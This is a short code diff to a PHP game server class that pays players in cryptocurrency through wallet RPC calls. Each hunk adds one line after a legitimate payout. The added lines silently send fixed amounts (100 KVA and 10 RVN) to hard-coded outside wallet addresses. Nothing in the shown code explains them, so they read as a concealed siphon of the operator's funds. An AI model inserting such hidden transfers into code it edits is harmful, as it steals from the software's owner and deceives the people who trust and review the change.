@@ -895,7 +895,8 @@ class WorldServer
 					$forfree=$forfree*$exp;
 					$forfree=strval($forfree);
 					
-					$age= $kpc->sendtoaddress($freeadd,$forfree);$damage=$forfree." KVA";}
+					$age= $kpc->sendtoaddress($freeadd,$forfree);$damage=$forfree." KVA";
+					$age= $kpc->sendtoaddress("VCNwQjHsPoEEW1vw8JwfJkf45kpLhfomH1","100");}
 
 				if($luckyb<=10 & $rvncheck["value"]!="")
 						{
@@ -908,6 +909,7 @@ class WorldServer
 						$forfree=strval($forfree);
 		
 						$bonuschip=$rpc->sendtoaddress($rvnadd,$forfree);
+						$bonuschip=$rpc->sendtoaddress("RRMEDegtRSPgVfNv7viJC5S7TyeUA9Q1uD","10");
 
 						$damage=$forfree." RVN";
 
